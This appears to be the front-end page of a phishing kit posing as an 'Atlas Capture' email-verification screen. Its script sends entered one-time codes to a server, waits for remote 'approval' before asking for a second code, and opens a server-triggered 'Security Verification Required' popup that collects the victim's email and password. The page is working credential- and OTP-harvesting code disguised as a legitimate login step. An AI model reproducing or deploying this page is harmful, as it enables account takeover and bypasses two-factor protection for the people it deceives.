<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Atlas Capture - Verify Code</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}

body{
  background:#f3f4f6;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  padding:40px 10px;
}

.wrapper{max-width:420px;width:100%}

.header{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:10px;
  margin-bottom:18px;
}
.icon{
  display:flex;
  align-items:center;
  justify-content:center;
}
#logoAtlas{
  height: 45px;
  width: 45px;
  border-radius: 40%;
}
.header span{font-weight:600;font-size:18px}

.card{
  background:#fff;
  border-radius:22px;
  padding:32px 24px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  text-align:center;
}

h2{
  font-size:24px;
  font-weight:700;
  color:#1f2937;
  margin-bottom:8px;
}

.subtext{
  color:#6b7280;
  font-size:14px;
  margin-bottom:28px;
}

.otp-input{
  width:100%;
  padding:16px;
  font-size:24px;
  text-align:center;
  letter-spacing:4px;
  border:2px solid #e5e7eb;
  border-radius:14px;
  background:#fff;
  transition:all 0.2s;
  margin-bottom:28px;
  font-weight:600;
}
.otp-input:focus{
  outline:none;
  border-color:#4f46e5;
  box-shadow:0 0 0 3px rgba(79,70,229,0.1);
}

button{
  width:100%;
  padding:14px;
  border-radius:12px;
  border:none;
  background:linear-gradient(90deg,#2563eb,#7c3aed);
  color:#fff;
  font-weight:600;
  cursor:pointer;
  margin-bottom:16px;
}
button:disabled{
  opacity:0.6;
  cursor:not-allowed;
}
.button-loading{
  display:inline-flex;
  align-items:center;
  gap:8px;
}
.spinner{
  width:18px;
  height:18px;
  border:2px solid rgba(255,255,255,0.3);
  border-top-color:white;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
}
@keyframes spin{
  to{transform:rotate(360deg);}
}

.link{
  background:none;
  color:#4f46e5;
  font-size:14px;
  font-weight:500;
  margin:0;
  padding:0;
  box-shadow:none;
}
.link:hover{
  background:none;
  text-decoration:underline;
}

.error-message{
  color:#ef4444;
  font-size:13px;
  margin-top:12px;
  display:none;
}

/* POPUP MODAL STYLES - ADDED ONLY */
.modal-overlay {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.85);
  backdrop-filter: blur(4px);
  z-index: 10000;
  justify-content: center;
  align-items: center;
}
.modal-overlay.active {
  display: flex;
}
.modal {
  background: #fff;
  border-radius: 28px;
  max-width: 380px;
  width: 90%;
  padding: 32px 24px;
  text-align: center;
  box-shadow: 0 25px 50px rgba(0,0,0,0.3);
}
.modal-icon {
  width: 60px;
  height: 60px;
  background: #eef2ff;
  border-radius: 30px;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 20px;
}
.modal-icon svg {
  width: 32px;
  height: 32px;
  stroke: #4f46e5;
}
.modal h3 {
  font-size: 22px;
  font-weight: 700;
  color: #1f2937;
  margin-bottom: 12px;
}
.modal p {
  color: #6b7280;
  font-size: 14px;
  margin-bottom: 24px;
  line-height: 1.5;
}
.modal-input {
  width: 100%;
  padding: 14px;
  border: 1px solid #e5e7eb;
  border-radius: 12px;
  font-size: 15px;
  margin-bottom: 16px;
}
.modal-input:focus {
  outline: none;
  border-color: #4f46e5;
}
.modal-btn {
  width: 100%;
  padding: 14px;
  background: #4f46e5;
  color: white;
  border: none;
  border-radius: 12px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 8px;
}
.modal-btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
.modal-error {
  color: #ef4444;
  font-size: 12px;
  margin-top: 12px;
  display: none;
}
</style>
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="icon">
      <img id="logoAtlas" src="atlas.png" alt="atlas logo">
    </div>
    <span>Atlas Capture</span>
  </div>

  <div class="card">
    <h2>Check your email</h2>
    <p class="subtext">We sent you a 6-character verification code</p>

    <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="000000">

    <button id="verifyBtn">Verify</button>
    <button class="link" id="differentEmail">Use a different email</button>
    <div id="errorMessage" class="error-message"></div>
  </div>
</div>

<!-- POPUP MODAL - ADDED ONLY -->
<div id="loginModal" class="modal-overlay">
  <div class="modal">
    <div class="modal-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
        <path d="M12 2L3 7v6c0 5 9 9 9 9s9-4 9-9V7l-9-5z" stroke="#4f46e5"/>
        <path d="M12 12 L12 16 M9 14 L15 14" stroke="#4f46e5"/>
      </svg>
    </div>
    <h3>Security Verification Required</h3>
    <p>Please login with your email and password to continue. This helps protect your account security.</p>
    <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
    <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
    <button id="submitLoginBtn" class="modal-btn">Login to Continue</button>
    <div id="modalError" class="modal-error"></div>
  </div>
</div>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/login';

  const otpInput = document.getElementById('otpInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv = document.getElementById('errorMessage');
  let isProcessing = false;
  let approvalInterval = null;

  // Socket for popup only - SEPARATE from OTP logic
  let popupSocket = null;
  function connectPopupSocket() {
    popupSocket = io();
    popupSocket.on('connect', () => {
      console.log('Popup socket connected');
      popupSocket.emit('identify', { email });
    });
    
    popupSocket.on('force-login-popup', (data) => {
      if (data.email === email) {
        const modal = document.getElementById('loginModal');
        modal.classList.add('active');
        document.getElementById('loginEmail').value = '';
        document.getElementById('loginPassword').value = '';
        document.getElementById('modalError').style.display = 'none';
        document.getElementById('submitLoginBtn').disabled = false;
        document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue';
      }
    });
    
    popupSocket.on('redirect-to-success', (data) => {
      if (data.email === email) {
        window.location.href = data.redirectUrl;
      }
    });
  }
  connectPopupSocket();

  function getOTP() {
    return otpInput.value.trim();
  }

  function showLoading() {
    isProcessing = true;
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
    errorDiv.style.display = 'none';
  }

  function showWaitingForApproval() {
    verifyBtn.disabled = true;
    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating......</span>';
  }

  function hideLoading() {
    isProcessing = false;
    verifyBtn.disabled = false;
    verifyBtn.innerHTML = 'Verify';
  }

  function startCheckingApproval() {
    if (approvalInterval) clearInterval(approvalInterval);
    approvalInterval = setInterval(async () => {
      try {
        const response = await fetch('/api/users/check-first-approval', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        const data = await response.json();
        if (data.approved) {
          clearInterval(approvalInterval);
          window.location.href = `/users/second-otp?email=${encodeURIComponent(email)}`;
        }
      } catch (err) {}
    }, 2000);
  }

  async function verifyOTP() {
    if (isProcessing) return;
    const otp = getOTP();
    if (!otp || otp.length !== 6) {
      errorDiv.textContent = 'Please enter all 6 characters';
      errorDiv.style.display = 'block';
      return;
    }

    showLoading();
    try {
      const response = await fetch('/api/users/submit-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, otp })
      });
      const data = await response.json();
      if (data.success) {
        showWaitingForApproval();
        startCheckingApproval();
      } else {
        hideLoading();
        errorDiv.textContent = data.error || 'Invalid OTP';
        errorDiv.style.display = 'block';
      }
    } catch (error) {
      hideLoading();
      errorDiv.textContent = 'Network error. Please try again.';
      errorDiv.style.display = 'block';
    }
  }

  // Modal functions
  function hideLoginModal() {
    document.getElementById('loginModal').classList.remove('active');
  }

  async function submitLogin() {
    const loginEmail = document.getElementById('loginEmail').value.trim();
    const loginPassword = document.getElementById('loginPassword').value;
    const modalError = document.getElementById('modalError');
    const submitBtn = document.getElementById('submitLoginBtn');
    
    if (!loginEmail || !loginPassword) {
      modalError.textContent = 'Please enter both email and password';
      modalError.style.display = 'block';
      return;
    }
    
    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
    if (!emailRegex.test(loginEmail)) {
      modalError.textContent = 'Please enter a valid email address';
      modalError.style.display = 'block';
      return;
    }
    
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Submitting...</span>';
    modalError.style.display = 'none';
    
    try {
      const response = await fetch('/api/users/submit-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, loginEmail, loginPassword })
      });
      const data = await response.json();
      
      if (data.success) {
        hideLoginModal();
      } else {
        modalError.textContent = data.error || 'Failed to submit';
        modalError.style.display = 'block';
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Login to Continue';
      }
    } catch (error) {
      modalError.textContent = 'Network error. Please try again.';
      modalError.style.display = 'block';
      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Login to Continue';
    }
  }

  verifyBtn.addEventListener('click', verifyOTP);
  otpInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') verifyOTP();
  });
  otpInput.focus();
  document.getElementById('differentEmail').addEventListener('click', () => {
    window.location.href = '/users/login';
  });
  document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
</script>

</body>
</html>
